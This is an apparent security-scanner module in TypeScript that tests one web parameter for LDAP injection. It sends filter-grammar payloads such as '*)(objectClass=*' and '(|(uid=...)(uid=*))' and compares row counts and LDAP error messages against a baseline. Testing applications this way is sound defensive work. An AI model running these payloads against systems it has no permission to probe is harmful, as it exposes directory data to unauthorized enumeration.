import { fetchUrl } from "../adapters/http.js";
import { normalizeBody, charSimilarity } from "./normalize.js";
import { writeArtifact } from "../adapters/artifacts.js";

/** LDAP injection differential: filter-grammar payloads (*, )(uid=*),
 *  boolean AND/OR filter widening, and LDAP error signatures. An injected
 *  wildcard that widens a filter shows as row-count/membership divergence
 *  vs the clean baseline. */

export interface LdapInput {
  readonly url: string;
  readonly method?: string;
  readonly param: string;
  readonly in?: "query" | "body";
  readonly bodyTemplate?: string;
  readonly outputRoot: string;
  readonly cookie?: string;
  readonly bearer?: string;
  readonly headers?: Record<string, string>;
  readonly proxy?: string;
  readonly timeoutMs?: number;
}
export interface LdapCase {
  readonly vector: string;
  readonly payload: string;
  readonly status: number;
  readonly len: number;
  readonly rows: number | null;
  readonly signal: string | null;
}
export interface LdapResult {
  readonly probed: number;
  readonly confirmed: { vector: string; payload: string; evidence: string }[];
  readonly leads: { vector: string; payload: string; evidence: string }[];
  readonly cases: LdapCase[];
  readonly artifacts: { path: string; bytes: number }[];
}

const LDAP_ERR = /LDAPResult|Invalid DN|Bad search filter|ldap_search|Netscape LDAP|LDAP: error|SizeLimitExceeded|Invalid credentials.*ldap/i;
const countRows = (body: string): number | null => {
  try {
    const j = JSON.parse(body) as unknown;
    if (Array.isArray(j)) return j.length;
    if (j && typeof j === "object") {
      const o = j as Record<string, unknown>;
      for (const k of ["data", "results", "items", "entries", "members", "users"]) if (Array.isArray(o[k])) return (o[k] as unknown[]).length;
      return Object.keys(o).length > 0 ? 1 : 0;
    }
    return null;
  } catch { return null; }
};

export const probeLdap = async (input: LdapInput): Promise<LdapResult> => {
  const method = input.method ?? (input.in === "body" ? "POST" : "GET");
  const where = input.in ?? "query";
  const hdrs = { ...(input.bearer ? { authorization: `Bearer ${input.bearer}` } : {}), ...(input.headers ?? {}) };
  const send = async (payload: string): Promise<LdapCase> => {
    let url = input.url; let body: string | undefined;
    if (where === "body") {
      const tpl = input.bodyTemplate ?? "{}";
      body = tpl.replace(new RegExp(`("${input.param}"\\s*:\\s*)("[^"]*")`), `$1${JSON.stringify(payload)}`);
    } else {
      const u = new URL(input.url);
      u.searchParams.set(input.param, payload);
      url = u.toString();
    }
    const r = await fetchUrl(url, { method, body, cookie: input.cookie, headers: body ? { "content-type": "application/json", ...hdrs } : hdrs, proxy: input.proxy, timeoutMs: input.timeoutMs ?? 15000, maxAttempts: 1 });
    return { vector: "", payload, status: r.status, len: r.bytes, rows: countRows(r.body), signal: LDAP_ERR.test(r.body) ? "ldap-error" : null };
  };
  const baseVal = where === "body" ? (new RegExp(`"${input.param}"\\s*:\\s*"([^"]*)"`).exec(input.bodyTemplate ?? "{}")?.[1] ?? "x") : (new URL(input.url).searchParams.get(input.param) ?? "x");
  const base = await send(baseVal);
  const cases: LdapCase[] = [{ ...base, vector: "baseline" }];
  const confirmed: LdapResult["confirmed"] = [];
  const leads: LdapResult["leads"] = [];
  const vectors: { v: string; p: string }[] = [
    { v: "wildcard", p: "*" },
    { v: "wildcard-prefixed", p: `*${baseVal}` },
    { v: "filter-close", p: "*)" },
    { v: "filter-widen-and", p: "*)(objectClass=*" },
    { v: "boolean-or", p: `(|(uid=${baseVal})(uid=*))` },
    { v: "boolean-and-true", p: `(&(uid=${baseVal})(objectClass=*))` },
    { v: "null-byte", p: `${baseVal}\u0000` },
    { v: "dn-injection", p: `*,dc=example,dc=com` },
  ];
  for (const { v, p } of vectors) {
    const c = { ...(await send(p)), vector: v };
    cases.push(c);
    if (c.signal) { leads.push({ vector: v, payload: p, evidence: `LDAP error signature (status ${c.status})` }); continue; }
    if (c.status >= 200 && c.status < 300 && base.rows !== null && c.rows !== null) {
      if (c.rows > Math.max(base.rows, 0)) confirmed.push({ vector: v, payload: p, evidence: `row count ${c.rows} vs baseline ${base.rows} — filter widened by injected grammar` });
      else if (c.rows !== base.rows && base.rows === 0 && c.rows > 0) confirmed.push({ vector: v, payload: p, evidence: `empty baseline returned ${c.rows} rows on wildcard` });
    }
  }
  const artifacts = [
    await writeArtifact(input.outputRoot, "ldap_cases.json", JSON.stringify(cases, null, 2)),
    await writeArtifact(input.outputRoot, "ldap_findings.md", ["# LDAP injection", "", `confirmed: ${confirmed.length}, leads: ${leads.length}`, "", ...confirmed.map(f => `- **CONFIRMED [${f.vector}]** \`${f.payload}\` — ${f.evidence}`), ...leads.map(f => `- lead [${f.vector}] \`${f.payload}\` — ${f.evidence}`)].join("\n")),
  ];
  return { probed: cases.length, confirmed, leads, cases, artifacts };
};
